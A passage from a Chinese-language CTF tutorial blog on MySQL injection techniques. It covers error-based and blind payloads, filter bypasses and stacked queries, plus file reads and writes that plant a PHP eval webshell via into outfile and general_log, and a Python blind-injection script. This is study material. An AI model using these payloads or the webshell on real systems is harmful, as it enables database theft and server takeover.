class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select name_const(version(),1),name_const(version(),1);;</span><br><span class="line">+--------+--------+</span><br><span class="line">| 5.5.47 | 5.5.47 |</span><br><span class="line">+--------+--------+</span><br><span class="line">|      1 |      1 |</span><br><span class="line">+--------+--------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">ERROR:</span><br><span class="line">No query specified</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from (select name_const(version(),1),name_const(version(),1))x;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#x27;5.5.47&#x27;</span><br></pre></td></tr></table></figure><p>不过这个有很大的限制，<code>version()</code>所多应的值必须是常量，而我们所需要的<code>database()</code>和<code>user()</code>都是变量，无法通过报错得出，但是我们可以利用这个原理配合join函数得到列名。</p><p>用法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from ctf_test a join ctf_test b;</span><br><span class="line">+------+--------------+------+--------------+</span><br><span class="line">| user | pwd          | user | pwd          |</span><br><span class="line">+------+--------------+------+--------------+</span><br><span class="line">| 1    | 0            | 1    | 0            |</span><br><span class="line">| 2    | flag&#123;OK_t72&#125; | 1    | 0            |</span><br><span class="line">| 1    | 0            | 2    | flag&#123;OK_t72&#125; |</span><br><span class="line">| 2    | flag&#123;OK_t72&#125; | 2    | flag&#123;OK_t72&#125; |</span><br><span class="line">+------+--------------+------+--------------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from (select * from ctf_test a join ctf_test b )x;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#x27;user&#x27;</span><br><span class="line">mysql&gt; select * from (select * from ctf_test a join ctf_test b using(user))x;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#x27;pwd&#x27;</span><br><span class="line">mysql&gt; select * from (select * from ctf_test a join ctf_test b using(user,pwd))x;</span><br><span class="line">+------+--------------+</span><br><span class="line">| user | pwd          |</span><br><span class="line">+------+--------------+</span><br><span class="line">| 1    | 0            |</span><br><span class="line">| 2    | flag&#123;OK_t72&#125; |</span><br><span class="line">+------+--------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><ul><li><strong>xpath语法报错与整数溢出报错的区别</strong></li></ul><p>xpath报错注入中，我们经常用的语法有<code>updatexml</code>和<code>extractvalue</code>函数，同样是报错注入，那么在使用中有什么区别？</p><p>例子：<strong>第12届全国大学生信息安全竞赛全宇宙最简单的SQL</strong></p><p>如果二者的区别认知不太清楚，很可能导致卡在这个点上</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from ctf_test where user=&#x27;1&#x27; and 1=1 and updatexml(1,concat(0x7e,(select database()),0x7e),1);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#x27;~test~&#x27;</span><br><span class="line">mysql&gt; select * from ctf_test where user=&#x27;1&#x27; and 1=0 and updatexml(1,concat(0x7e,(select database()),0x7e),1);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#x27;~test~&#x27;</span><br><span class="line">mysql&gt; select * from ctf_test where user=&#x27;1&#x27; and 1=1 and pow(999,999);</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &#x27;pow(999,999)&#x27;</span><br><span class="line">mysql&gt; select * from ctf_test where user=&#x27;1&#x27; and 1=0 and pow(999,999);</span><br><span class="line">Empty set (0.00 sec)</span><br></pre></td></tr></table></figure><p><strong>从上面的实验中可以得出如果在sql语句中有出现语法错误，则会直接报错，不会被and短路运算所影响，如果是大数溢出报错，则会遵循and短路运算规则</strong>。所以可以利用大数溢出这个问题结合前面的1=0的判断条件进行布尔盲注。</p><ul><li><strong>整数溢出报错函数</strong></li></ul><p>pow(),cot(),exp()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from ctf_test where user=&#x27;2&#x27; and 1=1 and cot(0);</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &#x27;cot(0)&#x27;</span><br><span class="line">mysql&gt; select * from ctf_test where user=&#x27;2&#x27; and 1=1 and pow(988888,999999);</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &#x27;pow(988888,999999)&#x27;</span><br><span class="line">mysql&gt; select * from ctf_test where user=&#x27;2&#x27; and 1=1 and exp(710);</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &#x27;exp(710)&#x27;</span><br></pre></td></tr></table></figure><ul><li><strong>利用几何函数进行报错注入</strong></li></ul><p>几何函数进行报错注入，如<code>polygon()</code>,<code>linestring()</code>函数等，姿势如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from ctf_test where user=&#x27;1&#x27; and polygon(user);</span><br><span class="line">ERROR 1367 (22007): Illegal non geometric &#x27;`test`.`ctf_test`.`user`&#x27; value found during parsing</span><br><span class="line">mysql&gt; select * from ctf_test where user=&#x27;1&#x27; and linestring(user);</span><br><span class="line">ERROR 1367 (22007): Illegal non geometric &#x27;`test`.`ctf_test`.`user`&#x27; value found during parsing</span><br></pre></td></tr></table></figure><ul><li><strong>对于insert,delete,update三种操作的注入</strong></li></ul><p>对于select类型操作其实是最常见，最容易上手的，但insert,delete,update三种操作的注入也很重要，下面是总结的这三种注入的操作姿势。</p><p><strong>报错注入</strong></p><p>insert报错注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into ctf_test(`user`,`pwd`) value(&#x27;1&#x27; or updatexml(1,concat(0x7e,(select database()),0x7e),1) or &#x27;&#x27;,&#x27;2&#x27;);</span><br></pre></td></tr></table></figure><p>update报错注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update ctf_test set user=1 where pwd=&#x27;2&#x27;  and updatexml(1,concat(0x7e,(select database()),0x7e),1) and &#x27;&#x27;;</span><br></pre></td></tr></table></figure><p>delete报错注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; delete from ctf_test where user=&#x27;1&#x27;  and updatexml(1,concat(0x7e,(select database()),0x7e),1) and &#x27;&#x27;;</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#x27;~test~&#x27;</span><br></pre></td></tr></table></figure><p><strong>时间盲注</strong></p><p>insert类型</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; insert into ctf_test(`user`,`pwd`) value(&#x27;1&#x27; and sleep(3) and &#x27;&#x27;,&#x27;2&#x27;);</span><br><span class="line">Query OK, 1 row affected (3.00 sec)</span><br></pre></td></tr></table></figure><p>delete和update也都是一样的，就不一 一列举了。</p><p>另类注入姿势以及对关键词过滤的绕过</p><ul><li><code>order by</code> 盲注</li></ul><p>题目例子：ISCC web5</p><p><a href="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g3gxkfjiljj30wr0cljz7.jpg"><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g3gxkfjiljj30wr0cljz7.jpg" alt="img"></a></p><p><strong>当填入16进制的字符字典序小于flag中对应字母的字典序时，返回的是union插入的字符；当16进制的字符字典序大于flag中的对应字母的字典序时，返回的是flag字段。</strong>此种sql注入手法可以在小括号和列名被过滤时使用。</p><p>web5对应脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url=&#x27;http://39.100.83.188:8054/&#x27;</span><br><span class="line">headers=&#123;&quot;User-Agent&quot;:&quot;lihuaiqiu Union.373&quot;&#125;</span><br><span class="line">payload=&quot;union_373_Tom&#x27; union select 1,2,0x&#123;&#125; order by 3,2,&#x27;1&quot;</span><br><span class="line">flag=&#x27;&#x27;</span><br><span class="line">for i in range(20):</span><br><span class="line">    for j in range(33,127):</span><br><span class="line">        data=&#123;&quot;username&quot;:payload.format((flag+chr(j)).encode(&#x27;hex&#x27;)),&quot;password&quot;:&#x27;233&#x27;&#125;</span><br><span class="line">        lihuaiqiu=requests.post(url,headers=headers,data=data)</span><br><span class="line">        if &quot;union_373_Tom&quot; in lihuaiqiu.text:</span><br><span class="line">            flag+=chr(j-1)</span><br><span class="line">            print flag</span><br><span class="line">            break</span><br></pre></td></tr></table></figure><ul><li><strong>MySQL数据库的Innodb引擎的注入</strong></li></ul><p>在对应代码中过滤了information关键字，无法使用<code>information_schema.tables</code>以及<code>information_schema.columns</code>进行查找表和列名。</p><p>此时可以通过innodb引擎进行注入，在Mysql 5.6以上的版本中，在系统Mysql库中存在两张与innodb相关的表：<code>innodb_table_stats</code>和<code>innodb_index_stats</code>。</p><p>所以可以通过查找这两个表取代information的作用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from flag where flag=1 union select group_concat(table_name) from mysql.innodb_table_stats where database_name=database();</span><br><span class="line">+------+</span><br><span class="line">| flag |</span><br><span class="line">+------+</span><br><span class="line">| 1    |</span><br><span class="line">| flag |</span><br><span class="line">+------+</span><br><span class="line">2 rows in set, 1 warning (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from flag where flag=1 union select group_concat(table_name) from mysql.innodb_index_stats where database_name=database();</span><br><span class="line">+----------------+</span><br><span class="line">| flag           |</span><br><span class="line">+----------------+</span><br><span class="line">| 1              |</span><br><span class="line">| flag,flag,flag |</span><br><span class="line">+----------------+</span><br><span class="line">2 rows in set, 1 warning (0.00 sec)</span><br></pre></td></tr></table></figure><ul><li>无列名注入</li></ul><p>看一下下面的<code>payload</code>的就会懂的，原理比较简单</p><p><a href="https://s2.ax1x.com/2019/06/25/ZZgHQU.md.png"><img src="ZZgHQU.md.png" alt="img"></a></p><ul><li>异或注入</li></ul><p>在<code>and,or ,|,&amp;&amp;,||</code>等符号被过滤的情况下，可以采用异或注入达到注入的目的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from ctf_test where user=&#x27;2&#x27;^(mid(user(),1,1)=&#x27;s&#x27;)^1;</span><br><span class="line">Empty set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from ctf_test where user=&#x27;2&#x27;^(mid(user(),1,1)=&#x27;r&#x27;)^1;</span><br><span class="line">+------+--------------+</span><br><span class="line">| user | pwd          |</span><br><span class="line">+------+--------------+</span><br><span class="line">| 2    | flag&#123;OK_t72&#125; |</span><br><span class="line">+------+--------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><ul><li>同等功能替换</li></ul><p>空格绕过：%0a,/**/.</p><p>关键函数过滤：</p><p>substr等价于left ,mid,substring</p><p>group_concat等价于concat_ws</p><ul><li>逗号被过滤</li></ul><p>针对逗号被过滤的情况有三种，第一种情况是<code>union select</code> 中的逗号被过滤掉，第二种情况是<code>substr,mid</code>这类截取字符函数中的逗号被过滤掉，第三种是<code>limit 0,1</code>中的逗号被过滤。</p><p><strong>union select 逗号被过滤掉</strong></p><p>利用join注入，payload如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from ctf_test where user=&#x27;2&#x27; union select * from (select 1)a join (select 2)b;</span><br><span class="line">+------+--------------+</span><br><span class="line">| user | pwd          |</span><br><span class="line">+------+--------------+</span><br><span class="line">| 2    | flag&#123;OK_t72&#125; |</span><br><span class="line">| 1    | 2            |</span><br><span class="line">+------+--------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p><strong>功能函数逗号被过滤</strong></p><p>利用<code>from...for...</code>进行绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from ctf_test where user=&#x27;2&#x27; and if(mid((select user()) from 1 for 1)=&#x27;r&#x27;,1,0);</span><br><span class="line">+------+--------------+</span><br><span class="line">| user | pwd          |</span><br><span class="line">+------+--------------+</span><br><span class="line">| 2    | flag&#123;OK_t72&#125; |</span><br><span class="line">+------+--------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from ctf_test where user=&#x27;2&#x27; and if(mid((select user()) from 1 for 1)=&#x27;s&#x27;,1,0);</span><br><span class="line">Empty set (0.00 sec)</span><br></pre></td></tr></table></figure><p><strong>limit中逗号被过滤</strong></p><p>利用<code>limit..offset</code>进行绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">limit 9 offset 4`表示从第十行开始返回4行，返回的是`10,11,12,13</span><br><span class="line">mysql&gt; select table_name from information_schema.tables where table_schema=database() limit 1 offset 0;</span><br><span class="line">+------------+</span><br><span class="line">| table_name |</span><br><span class="line">+------------+</span><br><span class="line">| admin      |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select table_name from information_schema.tables where table_schema=database() limit 1 offset 1;</span><br><span class="line">+------------+</span><br><span class="line">| table_name |</span><br><span class="line">+------------+</span><br><span class="line">| ctf_test   |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><ul><li><strong>等于号被过滤</strong></li></ul><p>可以用like,regexp,between…and..,rlike进行代替，用法如下：<br><a href="https://s2.ax1x.com/2019/06/26/ZZ7QC4.md.png"><img src="ZZ7QC4.md.png" alt="img"></a></p><p>还有另外一种特殊的代替方法，利用<code>locate,position,instr</code>三种函数进行判断</p><p>用法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from ctf_test where user=&#x27;2&#x27; and if(locate(&#x27;ro&#x27;, substring(user(),1,2))&gt;0,1,0);</span><br><span class="line">+------+--------------+</span><br><span class="line">| user | pwd          |</span><br><span class="line">+------+--------------+</span><br><span class="line">| 2    | flag&#123;OK_t72&#125; |</span><br><span class="line">+------+--------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from ctf_test where user=&#x27;2&#x27; and if(position(&#x27;ro&#x27; IN substring(user(),1,2))&gt;0,1,0);</span><br><span class="line">+------+--------------+</span><br><span class="line">| user | pwd          |</span><br><span class="line">+------+--------------+</span><br><span class="line">| 2    | flag&#123;OK_t72&#125; |</span><br><span class="line">+------+--------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from ctf_test where user=&#x27;2&#x27; and if(instr(substring(user(),1,2),&#x27;ro&#x27;)&gt;0,1,0);</span><br><span class="line">+------+--------------+</span><br><span class="line">| user | pwd          |</span><br><span class="line">+------+--------------+</span><br><span class="line">| 2    | flag&#123;OK_t72&#125; |</span><br><span class="line">+------+--------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><ul><li><strong>堆叠注入</strong></li></ul><p>例子：强网杯2019随便注</p><p>payload如下形式</p><p>查询字段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;;use information_schema;set @sql=concat(&#x27;s&#x27;,&#x27;elect column_name from columns wher&#x27;,&#x27;e table_name=&quot;1919810931114514&quot;&#x27;);PREPARE stmt1 FROM @sql;EXECUTE stmt1;</span><br></pre></td></tr></table></figure><p>查询内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;use supersqli;set @sql=concat(&#x27;s&#x27;,&#x27;elect `flag` from `1919810931114514`&#x27;);PREPARE stmt1 FROM @sql;EXECUTE stmt1;</span><br></pre></td></tr></table></figure><ul><li><strong>load_file&amp;into outfile</strong></li></ul><p>这两个函数在sql注入中是影响比较大的两个函数，如果能成功利用，即可<code>getshell</code>和读取任意文件,但作用很大，同样限制条件也很多。</p><p><strong>into outfile</strong></p><p>1.首先要知道网站的绝对路径(可从报错或者phpinfo()中获得)</p><p>2.拥有file权限</p><p>3.secure_file_priv限制。通过<code>SHOW VARIABLES LIKE &quot;secure_file_priv&quot;</code>查看信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysqld --secure_file_priv=null(不允许导入导出)</span><br><span class="line"></span><br><span class="line">mysqld --secure_file_priv=/tmp/(导入导出只允许在/tmp目录下)</span><br><span class="line"></span><br><span class="line">mysql  --secure_file_priv=(任意导入导出)</span><br></pre></td></tr></table></figure><p><code>into outfile</code>有四种写入文件的方式</p><p><strong>通过union注入写入文件</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from flag where flag=1 union select &#x27;&lt;?php phpinfo();?&gt;&#x27; into outfile &#x27;/var/lib/mysql-files/2.php&#x27;;</span><br><span class="line">Query OK, 2 rows affected, 1 warning (0.01 sec)</span><br></pre></td></tr></table></figure><p><a href="https://s2.ax1x.com/2019/06/26/Ze50qf.md.png"><img src="Ze50qf.md.png" alt="img"></a></p><p><strong>通过FIELDS TERMINATED BY写入文件</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from flag where flag=1 into outfile &#x27;/var/lib/mysql-files/3.php&#x27; fields terminated by 0x3c3f70687020706870696e666f28293b3f3e;</span><br><span class="line">Query OK, 1 row affected, 1 warning (0.01 sec)</span><br></pre></td></tr></table></figure><p><code>FIELDS TERMINATED BY</code>为在输出数据的字段中添加<code>FIELDS TERMINATED BY</code>的内容，如果字段数为1，则无法进行添加，也就是说这个的限制条件是起码要有两个字段的。</p><p><a href="https://s2.ax1x.com/2019/06/26/ZeT9xA.md.png"><img src="ZeT9xA.md.png" alt="img"></a></p><p>可以看到在一个字段的情况下无法添加我们的webshell。</p><p><strong>通过LINES TERMINATED BY写入文件</strong></p><p><code>LINES TERMINATED BY</code>为在每个记录后都添加设定添加的内容，不受字段数的限制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from flag where flag=1 into outfile &#x27;/var/lib/mysql-files/3.php&#x27; lines terminated by 0x3c3f70687020706870696e666f28293b3f3e;</span><br><span class="line">Query OK, 1 row affected, 1 warning (0.00 sec)</span><br></pre></td></tr></table></figure><p><a href="https://s2.ax1x.com/2019/06/26/ZeTbWQ.md.png"><img src="ZeTbWQ.md.png" alt="img"></a></p><p><strong>LINES STARTING BY写入shell</strong></p><p>用法与<code>LINES TERMINATED BY</code>一样，payload如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from flag where flag=1 into outfile &#x27;/var/lib/mysql-files/4.php&#x27; lines starting by 0x3c3f70687020706870696e666f28293b3f3e;</span><br><span class="line">Query OK, 1 row affected, 1 warning (0.01 sec)</span><br></pre></td></tr></table></figure><p><strong>load_file</strong></p><p>1.要求拥有file权限</p><p>2.知道文件所在绝对路径</p><p>3.同样受<code>secure_file_priv</code>限制</p><p><strong>union注入进行load_file</strong></p><p>效果如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from flag where flag=1 union select load_file(&#x27;/var/lib/mysql-files/4.php&#x27;);</span><br><span class="line">+----------------------+</span><br><span class="line">| flag                 |</span><br><span class="line">+----------------------+</span><br><span class="line">| 1                    |</span><br><span class="line">| &lt;?php phpinfo();?&gt;1</span><br><span class="line"> |</span><br><span class="line">+----------------------+</span><br><span class="line">2 rows in set, 1 warning (0.01 sec)</span><br></pre></td></tr></table></figure><p><strong>利用报错注入进行load_file</strong></p><p>测试：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from flag where flag=1 and updatexml(1,concat(0x7e,(select load_file(&#x27;/var/lib/mysql-files/4.php&#x27;)),0x7e),1);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#x27;~&lt;?php phpinfo();?&gt;1</span><br><span class="line">~&#x27;</span><br></pre></td></tr></table></figure><p>成功得到文件内容</p><p><strong>利用时间盲注进行load_file</strong></p><p>测试如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from flag where flag=1 and if(mid((select load_file(&#x27;/var/lib/mysql-files/4.php&#x27;)),1,1)=&#x27;&lt;&#x27;,sleep(3),1);</span><br><span class="line">Empty set, 1 warning (3.00 sec)</span><br></pre></td></tr></table></figure><p>成功延时3s，可配合脚本得到文件内容。</p><p><strong>利用load_file扫描文件是否存在</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from flag where flag=&#x27;&#x27; and updatexml(0,concat(0x7e,isnull(LOAD_FILE(&#x27;/var/lib/mysql-files/4.php&#x27;)),0x7e),0);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#x27;~0~&#x27;</span><br><span class="line">mysql&gt; select * from flag where flag=&#x27;&#x27; and updatexml(0,concat(0x7e,isnull(LOAD_FILE(&#x27;/var/lib/mysql-files/1.php&#x27;)),0x7e),0);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#x27;~1~&#x27;</span><br></pre></td></tr></table></figure><p>通过<code>is_null</code>函数的返回值来确定，如果是1的话代表文件不存在，如果是0的话文件存在。此方法可配合burp进行敏感文件的FUZZ。</p><p><strong>另类写读文件</strong></p><p><strong>dumpfile</strong> 官方文档如下：</p><p><a href="https://s2.ax1x.com/2019/06/26/Zmk139.md.png"><img src="Zmk139.md.png" alt="img"></a></p><p><strong>危险变量导致getshell</strong></p><p>在我们可连接上被攻击数据库时，我们可以通过<code>select..into outfile..</code>进行写shell，但如果<code>secure_file_priv</code>为NULL且不可更改时，我们就无法通过这种形式去getshell。除了这种写shell的方式还有一种通过日志去写shell的方式，操作如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;%general%&#x27;; 查看配置信息</span><br><span class="line"></span><br><span class="line">set global general_log=on 开启general log模式</span><br><span class="line"></span><br><span class="line">set global general_log_file=&#x27;F:\\phpstudy\\www\\shell.php&#x27;;</span><br><span class="line"></span><br><span class="line">select &#x27;&lt;?php eval($_POST[&#x27;pwd&#x27;]);?&gt;&#x27;;</span><br></pre></td></tr></table></figure><p>最终<code>shell.php</code>为我们的<code>webshell</code></p><p><a href="https://s2.ax1x.com/2019/06/26/ZmGHSI.md.png"><img src="ZmGHSI.md.png" alt="img"></a></p><p>组合拳思考</p><p>我们在常规的注入中，流程应该就是查找数据库，查找表，查找字段，爆字段。</p><p>其实利用上面的方法，我们可以做操作来绕过条件过滤。</p><p>以<code>Sqli-lab less-1</code>为例</p><p>首先通过<code>polygon</code>函数进行报错</p><p><a href="https://s2.ax1x.com/2019/06/26/Zmuiy4.md.png"><img src="Zmuiy4.md.png" alt="img"></a></p><p>接着通过列重复来报错</p><p><a href="https://s2.ax1x.com/2019/06/26/ZmK8vF.md.png"><img src="ZmK8vF.md.png" alt="img"></a></p><p><a href="https://s2.ax1x.com/2019/06/26/ZmKyKe.md.png"><img src="ZmKyKe.md.png" alt="img"></a></p><p>通过以上步骤可爆出<code>id,username,password</code>三个字段，最终爆出字段内容。</p><p><a href="https://s2.ax1x.com/2019/06/26/ZmMzFI.md.png"><img src="ZmMzFI.md.png" alt="img"></a></p><p>同理，order by盲注也比较有用，在列名以及小括号被过滤的情况下就比较适合。</p><p>参考资料</p><p><a href="https://xz.aliyun.com/t/2460">https://xz.aliyun.com/t/2460</a></p><p><a href="http://www.zhutougg.com/2017/04/25/mysqlshu-ju-ku-de-innodbyin-qing-de-zhu-ru/">http://www.zhutougg.com/2017/04/25/mysqlshu-ju-ku-de-innodbyin-qing-de-zhu-ru/</a></p><p><a href="https://xz.aliyun.com/t/253">https://xz.aliyun.com/t/253</a></p><h1 id="Bypass-information-schema与无列名注入"><a href="#Bypass-information-schema与无列名注入" class="headerlink" title="Bypass information_schema与无列名注入"></a>Bypass information_schema与无列名注入</h1><h1 id="Bypass-information-schema"><a href="#Bypass-information-schema" class="headerlink" title="Bypass information_schema"></a>Bypass inf<a href="https://so.csdn.net/so/search?q=orm">orm</a>ation_schema</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>聊一聊mysql在被waf禁掉了information_<a href="https://so.csdn.net/so/search?q=schema">schema</a>库后还能有哪些利用思路，这个想法是前一段时间想到的，这次趁着安全客活动就在这里记录一下吧~</p><blockquote><p><strong>实验环境</strong><br>windows 2008 r2<br>phpstudy （mysql 5.7）<br>某waf（原因是<strong>该waf可以设置非法访问information_schema数据库</strong>）</p></blockquote><h2 id="前置任务"><a href="#前置任务" class="headerlink" title="前置任务"></a>前置任务</h2><p>进行bypass之前先了解一下mysql中的information_schma这个库是干嘛的，在SQL注入中它的作用是什么，那么有没有可以替代这个库的方法呢？</p><p><strong>information_schema</strong></p><blockquote><p>简单来说，这个库在mysql中就是个信息数据库，它保存着mysql服务器所维护的所有其他数据库的信息，包括了数据库名，表名，字段名等。</p></blockquote><p> 在注入中，infromation_schema库的作用无非就是可以获取到table_schema、table_name、column_name这些数据库内的信息。</p><h2 id="MySQL5-7的新特性"><a href="#MySQL5-7的新特性" 